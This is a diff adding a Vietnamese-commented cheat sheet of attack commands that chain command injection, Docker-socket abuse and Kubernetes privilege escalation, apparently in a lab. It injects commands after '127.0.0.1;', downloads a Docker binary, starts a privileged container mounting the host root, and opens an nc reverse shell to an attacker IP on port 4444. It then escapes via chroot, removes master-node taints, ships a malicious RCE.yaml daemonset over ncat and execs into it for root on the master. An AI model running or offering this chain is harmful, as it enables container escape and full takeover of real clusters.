@@ -1,0 +1,40 @@
+# lệnh DIND
+127.0.0.1; id               # Kiểm tra cấu trúc lệnh có chèn đc sau dấu ; không
+
+; mount                     # kiểm tra các biến môi trường xem có mount của docker không
+
+;uname -a                   #Kiểm tra phân quyền
+
+;wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz -O /tmp/docker.tgz       #Tải docker về vài bỏ vào thư mục tmp để khai thác bằng docker do chưa có docker sẵn trong container
+
+;tar -xvzf /tmp/docker.tgz -C /tmp/             # Giải nén docker vào thư mục để sử dụng
+//docker/ docker/docker-containerd-ctr docker/docker-proxy docker/docker docker/docker-containerd docker/dockerd docker/docker-init docker/docker-containerd-shim docker/docker-runc    #đây là output của lệnh trên thể hiện các lệnh docker có thể dùng theo cấu trúc tmp/docker/docker
+;tmp/docker/docker -H unix:///run/docker.sock images    # Thử nghiệm xem lệnh docker có thực thi đượng không
+
+#khai thác RCE
+
+
+;/tmp/docker/docker -H unix:///var/run/docker.sock run -i --rm --privileged   -v /:/host --network=host alpine sh -c  "mkfifo /tmp/p; cat /tmp/p | sh 2>&1 | nc 192.168.1.24 4444 > /tmp/p"     # Tạo docker alpine có thông với root của container thông qua host và được phép sử dụng địa chỉ mạng của container và thực hiện lệnh kết nối với IP máy tấn công qua port 4444
+
+
+;hostname -I 	# hiển thị IP của container để kết nối
+ncat.exe -lvp 4444 	#lắng nghe để RCE thông qua docker thực hiện ở máy tấn công
+
+#escape to host
+
+chroot /host sh		# từ docker có /:/host có thể dùng chroot /host sh để thông ra root của container vì container tiếp tục thông qua worker nên ta có quyền root của máy workernode
+
+kubectl describe node k8s-master.ndbien.local | grep Taint 				#kiểm tra taints  
+kubectl taint nodes k8s-master.ndbien.local node-role.kubernetes.io/master:NoSchedule- 	# hủy taints
+
+# Worker to master
+Get-Content RCE-master.yaml | ncat.exe 192.168.1.3 4444 			# Gui file qua worker de exploit (thực hiện tại máy tấn công)
+nc -lvp 4444 > RCE.yaml 							# Nhan file mã độc từ máy tấn công và lưu với tên RCE.yaml
+cat /etc/passwd | cut -d: -f1						# kiem tra tat ca người dùng tren máy
+find /home -name "config" -path "*/.kube/config" 2>/dev/null		# tim user nao co rule .kube -> nguoi dung su ung duoc kubetl
+sudo -u vagrant kubectl auth can-i '*' '*' --all-namespaces			# kiem tra xem user do co quyen truy cap toan bo kubectl khong
+kubectl apply -f RCE.yaml                                           # Thực thi container chứa mã độc lên toàn bộ hệ thống (được config ở RCE.yaml)
+getent group sudo								# kiem tra nguoi dung co quyen sudo
+kubectl get pods -n kube-system -o wide						# kiem tra xem pods đã cài trên master có mã là gì (rce-daemon-mdg5j)
+kubectl exec -i -n kube-system rce-daemon-mdg5j  -- chroot /host /bin/bash	# chay shell cua pod do voi lenh chroot /host /bin/bash để thông vào root qua container trên root
+
